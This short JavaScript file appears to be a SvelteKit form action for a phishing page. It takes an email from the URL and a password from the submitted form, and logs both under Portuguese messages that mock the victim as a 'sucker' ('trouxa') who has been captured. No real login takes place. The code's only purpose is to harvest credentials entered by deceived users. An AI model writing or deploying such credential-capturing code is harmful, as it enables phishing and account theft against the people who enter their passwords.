export const actions = {
  default: async ({ request, url }) => {
    const formData = await request.formData()
    const password = formData.get("password")
    const email = url.searchParams.get("email") 

    console.log("TROUXA CAPTURADO!!")
    console.log(`E-MAIL DO TROUXA: ${email}`)
    console.log(`SENHA DO TROUXA: ${password}`)
  }
}